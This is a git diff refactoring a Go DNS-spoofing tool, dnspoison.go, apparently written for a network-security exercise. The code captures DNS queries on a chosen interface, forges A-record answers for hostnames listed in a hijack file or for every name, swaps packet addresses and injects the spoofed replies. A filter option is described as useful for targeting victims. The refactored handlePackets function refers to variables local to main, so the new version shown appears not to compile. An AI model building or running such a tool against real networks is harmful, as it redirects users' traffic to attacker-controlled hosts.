@@ -20,62 +20,42 @@ import (
 	"strings"
 )
 
+var (
+	ifcName       string // interface name
+	hostFile      string
+	bpfFilter     string
+	defaultIP     net.IP
+	ipHostMapping map[string]string
+
+	decoder       *gopacket.DecodingLayerParser
+	decodedLayers []gopacket.LayerType
+	serialOpts    gopacket.SerializeOptions
+	buf           gopacket.SerializeBuffer
+
+	ethLayer  layers.Ethernet
+	ipv4Layer layers.IPv4
+	udpLayer  layers.UDP
+	dnsLayer  layers.DNS
+)
+
 // go run dnspoison.go [-i interface] [-f hostnames] [expression]
 func main() {
-	// Parsing command lines
-	var ifaceName string
-	var hostFile string
-	var bpfFilterArr []string
-	flag.StringVar(&ifaceName, "i", "", "Live capture from the network device <interface> (e.g., eth0). If not specified, mydump should automatically select a default interface to listen on.")
-	flag.StringVar(&hostFile, "f", "", "Read a list of IP address and hostname pairs specifying the hostnames to be hijacked. If '-f' is not specified, dnspoison would forge replies to all observed requests with the chosen interface's IP address as an answer")
-	flag.Usage = func() {
-		_, _ = fmt.Fprintf(flag.CommandLine.Output(), "Usage of %s:\n", os.Args[0])
-		flag.PrintDefaults()
-		fmt.Println("<expression> is a BPF filter that specifies a subset of the traffic to be monitored, which is useful for targeting a single victim or a group of victims")
-	}
-	flag.Parse()
-	bpfFilterArr = flag.Args()
-	if ifaceName == "" { // interface is not specified, set as default device interface
-		ifs, _ := pcap.FindAllDevs()
-		ifaceName = ifs[0].Name
-	}
-	// fmt.Println("Arguments:", ifaceName, hostFile, strings.Join(bpfFilterArr, " "))
+	parseCommand()
 
 	// opens a device and returns a handle
-	handle, err := pcap.OpenLive(ifaceName, 1600, true, pcap.BlockForever)
+	handle, err := pcap.OpenLive(ifcName, 1600, true, pcap.BlockForever)
 	if err != nil {
 		panic(err)
-	} else if flag.NArg() != 0 { // set BPFFilter if specified
-		if err := handle.SetBPFFilter(strings.Join(bpfFilterArr, " ")); err != nil {
-			panic(err)
-		} else { // assign default BPFFilter
-			_ = handle.SetBPFFilter("udp port 53")
-		}
+	} else if err := handle.SetBPFFilter(bpfFilter); err != nil {
+		panic(err)
 	}
 	defer handle.Close()
 
-	ip := getIfaceAddr(ifaceName)    // get ip addr relates to the specified interface
-	ipHosts := readMapping(hostFile) // read ip host mapping from file
+	defaultIP = queryIfcAddr(ifcName)     // get ip addr relates to the specified interface
+	ipHostMapping = readMapping(hostFile) // read ip host mapping from file
 
-	// Create a DecodingLayerParser for decoding
-	var ethLayer layers.Ethernet
-	var ipv4Layer layers.IPv4
-	var udpLayer layers.UDP
-	var dnsLayer layers.DNS
-	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
-	decodedLayers := make([]gopacket.LayerType, 0, 4)
-	buf := gopacket.NewSerializeBuffer()
-	serialOpts := gopacket.SerializeOptions{
-		FixLengths:       true,
-		ComputeChecksums: true,
-	}
+	setupDecoder()
 
-	// swap storage for ip and udp fields
-	var ipv4Addr net.IP
-	var udpPort layers.UDPPort
-	var ethMac net.HardwareAddr
-
-	var i uint16
 	for {
 		packetData, _, _ := handle.ReadPacketData()
 		err = decoder.DecodeLayers(packetData, &decodedLayers)
@@ -83,88 +63,38 @@ func main() {
 			continue
 		}
 
-		fmt.Println("========== Packet captured! ==========")
-		fmt.Printf("DNS questions: total %v\n", dnsLayer.QDCount)
-		for i = 0; i < dnsLayer.QDCount; i++ {
-			fmt.Printf("[%v]: %v", i, string(dnsLayer.Questions[i].Name))
-		}
-
-		dnsLayer.QR = true // QR: true indicates a response packet
-		if dnsLayer.RD {   // RD(Recursion Desired): is set in a query and is copied into the response.
-			dnsLayer.RA = true // RA(Recursion Available): indicates recursive query is available in the name server.
-		}
-
-		forge := false
-		var q layers.DNSQuestion
-		for i = 0; i < dnsLayer.QDCount; i++ { // iterate through questions
-			q = dnsLayer.Questions[i]
-			if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
-				continue
-			}
-
-			var a layers.DNSResourceRecord
-			a.Type = layers.DNSTypeA
-			a.Class = layers.DNSClassIN
-			a.TTL = 300
-			a.Name = q.Name
-			// assign related ip addr
-			if ipHosts == nil { // mapping file is not specified, use ip addr of interface
-				forge = true
-				a.IP = ip
-			} else if ipStr, ok := ipHosts[string(q.Name)]; ok { // use ip addr in mapping file
-				forge = true
-				a.IP = net.ParseIP(ipStr)
-			} else { // ip addr is not provided in mapping file, ignore
-				continue
-			}
-			fmt.Printf("forged: type %v, [%v] -> [%v]", a.Type, string(q.Name), a.IP)
-			dnsLayer.Answers = append(dnsLayer.Answers, a)
-			dnsLayer.ANCount = dnsLayer.ANCount + 1
-			fmt.Printf("DNS answer total: %v\n", dnsLayer.ANCount)
-		}
-
-		if forge == false {
-			fmt.Println("no need to forge response")
-			continue
-		}
-
-		// swap src/dst mac
-		ethMac = ethLayer.SrcMAC
-		ethLayer.SrcMAC = ethLayer.DstMAC
-		ethLayer.DstMAC = ethMac
-		// swap src/dst ip
-		ipv4Addr = ipv4Layer.SrcIP
-		ipv4Layer.SrcIP = ipv4Layer.DstIP
-		ipv4Layer.DstIP = ipv4Addr
-		fmt.Printf("IP: src %v, dst %v\n", ipv4Layer.SrcIP, ipv4Layer.DstIP)
-		// swap src/dst udp ports
-		udpPort = udpLayer.SrcPort
-		udpLayer.SrcPort = udpLayer.DstPort
-		udpLayer.DstPort = udpPort
-		fmt.Printf("UDP port: src %v, dst %v\n", udpLayer.SrcPort, udpLayer.DstPort)
-
-		// serialize packets
-		_ = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer)
-		_ = gopacket.SerializeLayers(buf, serialOpts, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
-
-		// write packet
-		err = handle.WritePacketData(buf.Bytes())
-		if err != nil {
-			panic(err)
-		}
-
-		fmt.Println("Response sent")
-
-		continue
+		handlePackets()
 	}
 
 }
 
-func getIfaceAddr(ifaceName string) net.IP {
-	ifaces, _ := net.Interfaces()
-	for i := range ifaces {
-		if ifaces[i].Name == ifaceName {
-			addrs, err := ifaces[i].Addrs()
+func parseCommand() {
+	flag.StringVar(&ifcName, "i", "", "Live capture from the network device <interface> (e.g., eth0). If not specified, mydump should automatically select a default interface to listen on.")
+	flag.StringVar(&hostFile, "f", "", "Read a list of IP address and hostname pairs specifying the hostnames to be hijacked. If '-f' is not specified, dnspoison would forge replies to all observed requests with the chosen interface's IP address as an answer")
+	flag.Usage = func() {
+		_, _ = fmt.Fprintf(flag.CommandLine.Output(), "Usage of %s:\n", os.Args[0])
+		flag.PrintDefaults()
+		fmt.Println("<expression> is a BPF filter that specifies a subset of the traffic to be monitored, which is useful for targeting a single victim or a group of victims")
+	}
+	flag.Parse()
+	bpfFilterArr := flag.Args()
+	if ifcName == "" { // interface is not specified, set as default device interface
+		ifs, _ := pcap.FindAllDevs()
+		ifcName = ifs[0].Name
+	}
+	if flag.NArg() != 0 {
+		bpfFilter = strings.Join(bpfFilterArr, " ")
+	} else {
+		bpfFilter = "udp port 53"
+	}
+	// fmt.Println("Arguments:", ifcName, hostFile, strings.Join(bpfFilterArr, " "))
+}
+
+func queryIfcAddr(ifcName string) net.IP {
+	interfaces, _ := net.Interfaces()
+	for i := range interfaces {
+		if interfaces[i].Name == ifcName {
+			addrs, err := interfaces[i].Addrs()
 			if err != nil {
 				panic(err)
 			}
@@ -176,7 +106,7 @@ func getIfaceAddr(ifaceName string) net.IP {
 			for _, addr := range addrs {
 				ip, _, _ := net.ParseCIDR(addr.String())
 				if ip.To4() != nil {
-					fmt.Println("ip to interface", ifaceName, ip)
+					fmt.Println("ip to interface", ifcName, ip)
 					return ip
 				}
 			}
@@ -202,4 +132,100 @@ func readMapping(filename string) map[string]string {
 	}
 	fmt.Println(ipHost)
 	return ipHost
+}
+
+func setupDecoder() {
+	decoder = gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
+	decodedLayers = make([]gopacket.LayerType, 0, 4)
+	buf = gopacket.NewSerializeBuffer()
+	serialOpts = gopacket.SerializeOptions{
+		FixLengths:       true,
+		ComputeChecksums: true,
+	}
+}
+
+func handlePackets() {
+	fmt.Println("========== Packet captured! ==========")
+	fmt.Printf("DNS questions: total %v\n", dnsLayer.QDCount)
+	var i uint16
+	for i = 0; i < dnsLayer.QDCount; i++ {
+		fmt.Printf("[%v]: %v", i, string(dnsLayer.Questions[i].Name))
+	}
+
+	dnsLayer.QR = true // QR: true indicates a response packet
+	if dnsLayer.RD {   // RD(Recursion Desired): is set in a query and is copied into the response.
+		dnsLayer.RA = true // RA(Recursion Available): indicates recursive query is available in the name server.
+	}
+
+	matched := false
+	var q layers.DNSQuestion
+	for i = 0; i < dnsLayer.QDCount; i++ { // iterate through questions
+		q = dnsLayer.Questions[i]
+		if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
+			continue
+		}
+
+		a := buildDNSAnswer(q)
+		if a.IP != nil {
+			matched = true
+			fmt.Printf("forged: type %v, [%v] -> [%v]", a.Type, string(q.Name), a.IP)
+			dnsLayer.Answers = append(dnsLayer.Answers, a)
+			dnsLayer.ANCount = dnsLayer.ANCount + 1
+			fmt.Printf("DNS answer total: %v\n", dnsLayer.ANCount)
+		}
+	}
+	if matched == false {
+		fmt.Println("no need to forge response")
+		return
+	}
+	// swap src/dst in each layer
+	swapSrcDst()
+	// serialize packets
+	_ = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer)
+	_ = gopacket.SerializeLayers(buf, serialOpts, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
+	// write packet
+	err = handle.WritePacketData(buf.Bytes())
+	if err != nil {
+		panic(err)
+	}
+
+	fmt.Println("Response sent")
+}
+
+func buildDNSAnswer(q layers.DNSQuestion) layers.DNSResourceRecord {
+	var a layers.DNSResourceRecord
+	a.Type = layers.DNSTypeA
+	a.Class = layers.DNSClassIN
+	a.TTL = 300
+	a.Name = q.Name
+	a.IP = getForgedIp(string(q.Name))
+	return a
+}
+
+// return nil if file is specified while corresponding host is not provided
+func getForgedIp(queryName string) net.IP {
+	if ipHostMapping == nil { // mapping file is not specified, use ip addr of interface
+		return defaultIP
+	} else if ipStr, ok := ipHostMapping[queryName]; ok { // use ip addr in mapping file
+		return net.ParseIP(ipStr)
+	} else { // ip addr is not provided in mapping file, ignore
+		return nil
+	}
+}
+
+func swapSrcDst() {
+	// swap src/dst mac
+	tmpMac := ethLayer.SrcMAC
+	ethLayer.SrcMAC = ethLayer.DstMAC
+	ethLayer.DstMAC = tmpMac
+	// swap src/dst ip
+	tmpIP := ipv4Layer.SrcIP
+	ipv4Layer.SrcIP = ipv4Layer.DstIP
+	ipv4Layer.DstIP = tmpIP
+	fmt.Printf("IP: src %v, dst %v\n", ipv4Layer.SrcIP, ipv4Layer.DstIP)
+	// swap src/dst udp ports
+	tmpPort := udpLayer.SrcPort
+	udpLayer.SrcPort = udpLayer.DstPort
+	udpLayer.DstPort = tmpPort
+	fmt.Printf("UDP port: src %v, dst %v\n", udpLayer.SrcPort, udpLayer.DstPort)
 }
